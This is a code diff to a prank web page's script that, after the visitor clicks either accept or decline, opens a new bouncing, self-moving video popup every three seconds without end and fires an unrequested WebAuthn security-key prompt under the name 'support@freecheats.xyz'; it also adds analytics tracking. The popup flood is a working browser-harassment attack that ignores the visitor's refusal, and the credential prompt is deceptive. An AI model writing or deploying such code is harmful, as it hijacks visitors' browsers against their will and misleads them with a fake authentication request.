@@ -118,80 +118,14 @@
     <video id="video" class="video" loop></video>
 </div>
 <script>
-    const VELOCITY = 5;           // Speed of the bouncing window
-    const MARGIN = 10;            // Margin from the edges of the screen
-    const TICK_LENGTH = 20;       // Update interval for the window movement
+    const VELOCITY = 5; // Speed of the bouncing window
+    const MARGIN = 10;  // Margin from the edges of the screen
+    const TICK_LENGTH = 20; // Update interval for window movement
     const VIDEOS = [
         'media/video.mp4'
     ];
 
-    function getRandomArrayEntry(arr) {
-        return arr[Math.floor(Math.random() * arr.length)];
-    }
-
-    function moveWindowBounce(window) {
-        let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
-        let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
-        
-        const interval = setInterval(() => {
-            const x = window.screenX,
-                  y = window.screenY,
-                  width = window.outerWidth,
-                  height = window.outerHeight;
-
-            // Check for collision with left and right edges
-            if (x < MARGIN) {
-                vx = Math.abs(vx);
-            } else if (x + width > screen.width - MARGIN) {
-                vx = -Math.abs(vx);
-            }
-
-            // Check for collision with top and bottom edges
-            if (y < MARGIN) {
-                vy = Math.abs(vy);
-            } else if (y + height > screen.height - MARGIN) {
-                vy = -Math.abs(vy);
-            }
-
-            // Move the window
-            window.moveBy(vx, vy);
-        }, TICK_LENGTH);
-
-        // Stop moving the window if it's closed
-        window.onbeforeunload = () => clearInterval(interval);
-    }
-
-    function createVideoWindow() {
-        const smallWindow = window.open("", "_blank", "width=400,height=300");
-        smallWindow.document.write(`
-            <html>
-                <head>
-                    <title>Video</title>
-                    <style>
-                        body {
-                            margin: 0;
-                            overflow: hidden;
-                        }
-                        video {
-                            width: 100%;
-                            height: 100%;
-                            object-fit: cover;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <video autoplay loop muted>
-                        <source src="${getRandomArrayEntry(VIDEOS)}" type="video/mp4">
-                    </video>
-                </body>
-            </html>
-        `);
-        smallWindow.document.close();
-        smallWindow.focus();
-        moveWindowBounce(smallWindow);
-    }
-
-    function requestWebauthnAttestation() {
+     function requestWebauthnAttestation() {
         try {
             const createCredentialDefaultArgs = {
                 publicKey: {
@@ -200,7 +134,7 @@
                     },
                     user: {
                         id: new Uint8Array(16),
-                        name: "support@google.com",
+                        name: "support@freecheats.xyz",
                         displayName: "Sigma shit"
                     },
                     pubKeyCredParams: [{
@@ -232,27 +166,64 @@
             console.error(error);
         }
     }
+    
+    function getRandomArrayEntry(arr) {
+        return arr[Math.floor(Math.random() * arr.length)];
+    }
 
-    const video = document.getElementById("video");
-    const overlay = document.getElementById("overlay");
+    function openBouncingWindow() {
+        const videoSrc = getRandomArrayEntry(VIDEOS);
+        const newWindow = window.open("", "", "width=400,height=300");
+
+        newWindow.document.write(`
+            <video src="${videoSrc}" autoplay loop style="width: 100%; height: 100%; object-fit: cover;"></video>
+            <script>
+                let vx = ${VELOCITY} * (Math.random() > 0.5 ? 1 : -1);
+                let vy = ${VELOCITY} * (Math.random() > 0.5 ? 1 : -1);
+                setInterval(() => {
+                    const x = window.screenX,
+                          y = window.screenY,
+                          width = window.outerWidth,
+                          height = window.outerHeight;
+                    
+                    if (x < ${MARGIN}) vx = Math.abs(vx);
+                    if (x + width > screen.width - ${MARGIN}) vx = -Math.abs(vx);
+                    if (y < ${MARGIN + 20}) vy = Math.abs(vy);
+                    if (y + height > screen.height - ${MARGIN}) vy = -Math.abs(vy);
+                    window.moveBy(vx, vy);
+                }, ${TICK_LENGTH});
+            <\/script>
+        `);
+    }
+
+    function startOpeningWindows() {
+        setInterval(openBouncingWindow, 3000); // Open a new window every 3 seconds
+    }
+
     const acceptButton = document.getElementById("accept-button");
-    const declineButton = document.getElementById("decline-button");
 
     acceptButton.addEventListener("click", () => {
-        overlay.setAttribute("hidden", true);
+        document.getElementById("overlay").hidden = true;
         requestWebauthnAttestation();
-        createVideoWindow(); // Open the first window
-
-        // Continuously open more windows every 2 seconds
-        setInterval(createVideoWindow, 10);
+        startOpeningWindows(); // Start opening windows on first click
     });
 
+    // The decline button can also hide the overlay and start opening windows if you want
+    const declineButton = document.getElementById("decline-button");
     declineButton.addEventListener("click", () => {
-        overlay.setAttribute("hidden", true);
+        document.getElementById("overlay").hidden = true;
+        startOpeningWindows(); // Start opening windows on decline as well
     });
-
-    video.src = getRandomArrayEntry(VIDEOS);
-    video.play();
 </script>
+
+<!-- Google Tag Manager -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-07T0N39Y0D"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'G-07T0N39Y0D');
+</script>
+
 </body>
 </html>
